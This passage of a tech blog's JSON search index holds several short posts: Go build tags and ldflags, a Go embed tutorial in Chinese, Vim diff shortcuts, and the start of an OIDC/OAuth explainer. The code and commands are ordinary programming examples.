style=\"color:#66d9ef\"\u003estring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;This build with ldflag:\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eflagString\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ go build -ldflags \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;-X main.flagString \u0026#34;test\u0026#34;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ./main\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eThis build with ldflag: test\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"go-build--tags\"\u003eGo build -tags\u003c/h5\u003e\n\u003ch6 id=\"debug_configgo\"\u003edebug_config.go\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e//+build debug\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eTestString\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;test debug\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eTestString2\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; and it will run every module with debug tag.\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eGetConfigString\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;it is debug.....\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\n\n    \n\n\n\u003cdiv class=\"alert warning\"\u003e\n    \u003cspan\u003e\u003ci data-feather=\"alert-triangle\"\u003e\u003c/i\u003e\u003c/span\u003e\n    \u003cspan\u003e\u003cstrong\u003e\u003ccode\u003e//+build debug\u003c/code\u003e 前後需要一個空行(除非你在第一行)\u003c/strong\u003e\u003c/span\u003e\n\u003c/div\u003e\n\n\u003ch6 id=\"release_configgo\"\u003erelease_config.go\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e//+build !debug\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eTestString\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;test release\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eTestString2\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; and it will run every module as no debug tag.\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eGetConfigString\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;it is release.....\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"main\"\u003emain\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;This build is \u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eTestString\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eTestString2\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eGetConfigString\u003c/span\u003e())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ go build -tags debug .\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ./main\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eThis build is  test debug  and it will run every module with debug tag. it is debug.....\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ go build .\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ./main\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eThis build is  test release  and it will run every module as no debug tag. it is release.....\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Go"],"title":"[Golang] 利用build tags達到不同的build config"},{"categories":["URL","Go"],"contents":" Go embed 简明教程 嵌入 对于单个的文件，支持嵌入为string和 []byre 对于多个文件和文件夹，支持嵌入为新的文件系统 FS 比如导入 \u0026ldquo;embed\u0026rdquo; 包，即使无显式的使用 go:embed 指令用来嵌入，必须紧跟着嵌入后的变量名 只支持嵌入为 string, []byte 和 embed.FS 三种类型，这三种类型的别名(alias)和命名类型(如 type S string)都不可以 使用的是相对路径 string/[]byte package main import ( _ \u0026#34;embed\u0026#34; \u0026#34;fmt\u0026#34; ) //go:embed hello.txt var s string //go:embed hello.txt var b []byte func main() { fmt.Println(s) fmt.Println(b) } embed.FS package main import ( \u0026#34;embed\u0026#34; \u0026#34;fmt\u0026#34; ) //go:embed hello.txt hello2.txt //go:embed \u0026#34;p/he llo.txt\u0026#34; //go:embed `p/hello-2.txt` //go:embed dir var f embed.FS func main() { data, _ := f.ReadFile(\u0026#34;hello.txt\u0026#34;) fmt.Println(string(data)) data, _ = f.ReadFile(\u0026#34;hello2.txt\u0026#34;) fmt.Println(string(data)) data, _ := f.ReadFile(\u0026#34;p/he llo.txt\u0026#34;) fmt.Println(string(data)) data, _ = f.ReadFile(\u0026#34;p/hello-2.txt\u0026#34;) fmt.Println(string(data)) } 匹配模式 go:embed 指令中可以只写文件夹名，此文件夹中除了.和_开头的文件和文件夹都会被嵌入，并且子文件夹也会被递归的嵌入，形成一个此文件夹的文件系统。\n如果想嵌入.和_开头的文件和文件夹， 比如 p 文件夹下的.hello.txt 文件，那么就需要使用*，比如 go:embed p/*。\n不具有递归性，所以子文件夹下的.和_不会被嵌入，除非你在专门使用子文件夹的进行嵌入\npackage main import ( \u0026#34;embed\u0026#34; \u0026#34;fmt\u0026#34; ) //go:embed p/* var f embed.FS //go:embed * var ff embed.FS func main() { data, _ := f.ReadFile(\u0026#34;p/.hello.txt\u0026#34;) fmt.Println(string(data)) data, _ = f.ReadFile(\u0026#34;p/q/.hi.txt\u0026#34;) // 没有嵌入 p/q/.hi.txt fmt.Println(string(data)) data, _ := ff.ReadFile(\u0026#34;hello.txt\u0026#34;) fmt.Println(string(data)) data, _ = ff.ReadFile(\u0026#34;.hello.txt\u0026#34;) fmt.Println(string(data)) } net/http http.Handle(\u0026quot;/\u0026quot;, http.FileServer(http.FS(ff)))\n","date":"July 12, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20220712-go-embed-tutorial/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://colobu.com/2021/01/17/go-embed-tutorial/\" target=\"_blank\" rel=\"noopener\"\u003eGo embed 简明教程\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"嵌入\"\u003e嵌入\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e对于单个的文件，支持嵌入为\u003ccode\u003estring\u003c/code\u003e和 \u003ccode\u003e[]byre\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e对于多个文件和文件夹，支持嵌入为新的文件系统 FS\u003c/li\u003e\n\u003cli\u003e比如导入 \u0026ldquo;embed\u0026rdquo; 包，即使无显式的使用\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ego:embed\u003c/code\u003e 指令用来嵌入，必须紧跟着嵌入后的变量名\u003c/li\u003e\n\u003cli\u003e只支持嵌入为 \u003ccode\u003estring\u003c/code\u003e, \u003ccode\u003e[]byte\u003c/code\u003e 和 \u003ccode\u003eembed.FS\u003c/code\u003e 三种类型，这三种类型的别名(alias)和命名类型(如 type S string)都不可以\u003c/li\u003e\n\u003cli\u003e使用的是相对路径\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"stringbyte\"\u003estring/[]byte\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;embed\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e//go:embed hello.txt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e//go:embed hello.txt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e []\u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"embedfs\"\u003eembed.FS\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;embed\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e//go:embed hello.txt hello2.txt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e//go:embed \u0026#34;p/he llo.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e//go:embed `p/hello-2.txt`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e//go:embed dir\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eembed\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFS\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eReadFile\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hello.txt\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(string(\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eReadFile\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hello2.txt\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(string(\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eReadFile\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;p/he llo.txt\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(string(\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eReadFile\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;p/hello-2.txt\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(string(\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"匹配模式\"\u003e匹配模式\u003c/h5\u003e\n\u003cp\u003ego:embed 指令中可以只写文件夹名，此文件夹中除了.和_开头的文件和文件夹都会被嵌入，并且子文件夹也会被递归的嵌入，形成一个此文件夹的文件系统。\u003c/p\u003e","tags":["URL","Go"],"title":"Go embed 简明教程"},{"categories":["URL","command line","Vim"],"contents":" Using Vim as a Diff Tool command vim -d file1.txt file2.txt or vimdiff file1.txt file2.txt\nSwitching Between Diff Windows: Ctrl-w + Ctrl-w Changing Split Window Orientation ctrl-w + K key combination to change window orientation from vertical to horizontal. ctrl-w + H shortcut to switch back window orientation to a vertical split. Jumping Between Changes ]c key combination to go to the next change. [c shortcut to jump to the previous change. Applying Changes From the Diff Window: :diffget, :diffput Export Diff to the HTML Web Page: :TOhtml | w ~/diff.html ","date":"July 7, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20220707-vim-diff-tool/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/vim-diff-tool\" target=\"_blank\" rel=\"noopener\"\u003eUsing Vim as a Diff Tool\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"command\"\u003ecommand\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003evim -d file1.txt file2.txt\u003c/code\u003e\nor\n\u003ccode\u003evimdiff file1.txt file2.txt\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSwitching Between Diff Windows: \u003ccode\u003eCtrl-w + Ctrl-w\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eChanging Split Window Orientation\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ectrl-w + K\u003c/code\u003e key combination to change window orientation from vertical to horizontal.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ectrl-w + H\u003c/code\u003e shortcut to switch back window orientation to a vertical split.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eJumping Between Changes\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e]c\u003c/code\u003e key combination to go to the next change.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e[c\u003c/code\u003e shortcut to jump to the previous change.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eApplying Changes From the Diff Window: \u003ccode\u003e:diffget\u003c/code\u003e, \u003ccode\u003e:diffput\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eExport Diff to the HTML Web Page: \u003ccode\u003e:TOhtml | w ~/diff.html\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","command line","Vim"],"title":"Using Vim as a Diff Tool"},{"categories":["URL","OIDC","Authentication","Authorization","OAuth"],"contents":" OIDC(OpenID Connect) 简介 Authentication vs. authorization Authentication 通常是指校验是否是用户本人的这个过程，而 Authorization 则更多的是指用户是否有权限。通常我们都是先校验 是否是用户本人，然后再校验用户是否有权限。也就是先开始 Authentication，再开始 Authorization。\nAuthentication Authorization Determines whether users are who they claim to be Determines what users can and cannot access Challenges the user to validate credentials (for example, through passwords, answers to security questions, or facial recognition) Verifies whether access is allowed through policies and rules Usually done before authorization Usually done after successful authentication Generally, transmits info through an ID Token Generally, transmits info through an Access Token Generally governed by the OpenID Connect (OIDC) protocol Generally governed by the OAuth 2.0 framework Example: Employees in a company are required to authenticate through the network before accessing their company email Example: After an employee successfully authenticates, the system determines what information the employees are allowed to access OAuth 2 Client Credentials Grant 这种模式是最简单的，其实就是客户端告诉服务端自己是哪个客户端，服务器就将 access_token 下发\n这种模式很少用，主要用于客户端非常可靠的情况，例如登录托管的云桌面系统，系统向服务器请求 token，服务器立刻下发，之后 用户就以云桌面特定用户的身份进行使用。\n+---------+ +---------------+ | | | | | |\u0026gt;--(A)- Client Authentication ---\u0026gt;| Authorization | | Client | | Server | | |\u0026lt;--(B)---- Access Token ---------\u0026lt;| | | | | | +---------+ +---------------+ Figure 6: Client Credentials Flow The flow illustrated in Figure 6 includes the following steps: (A) The client authenticates with the authorization server and requests an access token from the token endpoint. (B) The authorization server authenticates the client, and if valid, issues an access token. Resource Owner Password Credentials Grant 